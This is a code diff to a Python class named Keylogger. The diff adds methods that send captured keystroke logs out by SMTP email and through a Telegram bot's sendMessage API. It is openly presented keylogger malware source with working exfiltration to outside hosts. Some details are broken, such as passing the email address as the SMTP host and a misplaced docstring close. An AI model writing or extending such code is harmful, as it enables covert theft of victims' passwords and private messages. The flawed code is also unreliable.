@@ -1,5 +1,6 @@
 import keyboard
 import requests
+import smtplib
 
 from re import fullmatch
 from contracts import contract, new_contract
@@ -36,34 +37,39 @@ class Keylogger:
         self.log = ""
 
     @contract
-    def report_to_email(self, email, password, message):
+    def report_to_email(self, email, password, text):
         """
         This method sends reports to the specified email.
 
         :param email: the name of the email where the logs will be sent
         :param password: password from email
-        :param message: log message template
+        :param text: log message template
 
         :type email: str,validationCheckEmail
         :type password: str
-        :type message: str
-        """
+        :type text: str        """
+        smtp = smtplib.SMTP(host=email, port=587)
+        smtp.starttls()
+        smtp.login(email, password)
+        smtp.sendmail(email, email, text)
+        smtp.quit()
 
     @contract
-    def report_to_telegram(self, bot_token, chat_id):
+    def report_to_telegram(self, bot_token, chat_id, text):
+        # TODO: new parameter: text. update doc/contract
         """
         This method sends reports via telegram bot
 
         :param bot_token: your bot token (get it in @BotFather)
         :param chat_id: actually your ID (get it in @username_to_id_bot)
+        :param text:
 
         :type bot_token: str
         :type chat_id: str
+        :type text:
         """
         url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
-        text = ""
         request = requests.post(url, data={"chat_id": chat_id, "text": text})
-
         if request.status_code != 200:
             request.raise_for_status()
 
